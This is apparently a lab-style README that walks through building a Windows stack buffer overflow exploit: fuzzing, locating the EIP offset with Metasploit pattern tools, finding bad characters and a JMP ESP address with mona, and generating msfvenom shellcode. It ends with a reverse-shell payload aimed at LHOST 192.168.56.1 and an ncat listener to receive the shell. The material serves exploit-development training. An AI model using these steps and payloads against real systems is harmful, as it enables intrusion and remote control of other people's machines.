# Steps :
## 1. Crash the application
Fuzz it with 1-fuzzing.py until it crashes. Find out how it crashed and if needed send a buffer larger than the one that crashed it in order to make sure that there is at least 400 bytes of room for the payload after $ESP.

**Checklist :**
* EIP is overwritten
* At least the 400 bytes that follow $ESP are overwritten
 
**Result :**
* A payload length that crashes the application

## 2. Locate the bytes that overwrite the EIP
Use 2-location.py to send a payload the same size as the one that previously crashed the application but that contains a recognisable pattern :
```
/opt/metasploit/tools/exploit/pattern_create.rb -l $SIZE
```
__Avoiding bad characters :__ Use the -s option if needed

Find the offset of the bytes that overwrite the EIP :
```
/opt/metasploit/tools/exploit/pattern_offset.rb -l $SIZE -q 34694133
```
__Note :__ There is no need to change the EIP bytes' order when searching its offset.

**Result :** 
* The offset of the bytes that override the EIP

## 3. Find the bad characters
Use 3-badchars.py to send a buffer that, after the EIP, will contain all ASCII characters to check for bad characters.
Bad characters will either simply not appear on the stack or mangle the characters that follow them.
Mona can look for bad characters :
```
!mona bytearray
!mona compare -f bytearray.bin -a ADDRESS_WHERE_ASCII_CHARACTERS_START
```

**Checklist :** 
* All the characters that aren't listed as bad must properly appear on the stack

**Result :** 
* A list of bad characters

## 4. Pop calc
As a first exploit, popping calc.exe is a way to make sure that code can be executed in a way that is less error-prone than going straight for a reverse shell. Use 4-exploit-calc.py for this.

## 4.1 Find an address that contains a JMP ESP instruction
List the modules to find one that doesn't have ASLR and NX bits :
```
!mona modules
```

Find the hex equivalent of the desired instruction (e.g JMP ESP)
```
/usr/share/metasploit-framework/tools/exploit/nasm\_shell.rb
nasm > jmp esp
00000000 FFE4 jmp esp
```

Find the desired instruction :
```
!mona find -s "\xff\xe4" -m slmfc.dll
!mona jmp -r ESP
```
Chose one that does **not** contain a bad character.
In the exploit, it needs to be reversed because of **little-endianness** :
"5f 4a 35 8f" -> "\x8f\x35\x4a\x5f"

## 4.2 Generate a payload and send the exploit
Then generate a payload with msfvenom :
```
msfvenom -p windows/exec CMD=calc.exe -f c -e "x86/shikata_ga_nai" -b "\x00\x0a\x0d"
```
If needed, wheck on the target if calc.exe is running using `tasklist` in an elevated command prompt.


**Checklist :**
* The address where JMP ESP is does not change when the program / host is restarted

**Result :**
* A working exploit that starts calc.exe


## 5. Get a reverse shell
Using 5-exploit.py and the information obtained in step 4, get a reverse shell.
To listen for the reverse shell :
```
ncat -lvnp 8080
```

To generate the exploit :
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=8080 -f c -e "x86/shikata_ga_nai" -b "\x00\x0a\x0d"
```

